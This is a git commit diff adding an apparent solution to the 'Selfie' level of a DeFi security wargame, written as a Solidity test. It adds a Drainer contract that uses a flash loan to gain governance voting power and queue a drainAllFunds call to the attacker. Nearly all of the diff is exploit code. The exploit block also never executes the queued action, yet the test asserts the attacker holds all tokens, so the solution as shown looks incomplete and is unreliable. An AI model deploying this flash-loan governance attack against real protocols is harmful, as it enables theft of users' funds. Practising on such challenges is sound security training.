908b8ee52c3629258e313399b558e401cccc9610
Your Name <you@example.com>
2023-03-06 16:02:04 +0000

    new Selfie exploit

--- test/Levels/selfie/Selfie.t.sol
+++ test/Levels/selfie/Selfie.t.sol
@@ -47,6 +47,15 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        Drainer d = new Drainer(
+            address(selfiePool),
+            address(simpleGovernance),
+            address(dvtSnapshot)
+        );
+        dvtSnapshot.snapshot();
+        d.start();
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -59,5 +68,36 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+}
+
+contract Drainer {
+    SelfiePool pool;
+    SimpleGovernance gov;
+    DamnValuableTokenSnapshot token;
+    address attacker;
+    uint256 actionId;
+
+    constructor(address _poolAddress, address _govAddress, address _tokenAddress) {
+        pool = SelfiePool(_poolAddress);
+        gov = SimpleGovernance(_govAddress);
+        token = DamnValuableTokenSnapshot(_tokenAddress);
+        attacker = msg.sender;
+    }
+
+    function start() external {
+        uint256 borrowAmount = token.balanceOf(address(pool));
+        pool.flashLoan(borrowAmount);
+    }
+
+    function execute() external {
+        gov.executeAction(actionId);
+    }
+
+    function receiveTokens(address _tokenAddress, uint256 _amount) external {
+        DamnValuableTokenSnapshot(_tokenAddress).snapshot();
+        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
+        actionId = gov.queueAction(address(pool), data, 0);
+        DamnValuableTokenSnapshot(_tokenAddress).transfer(address(pool), _amount);
     }
 }
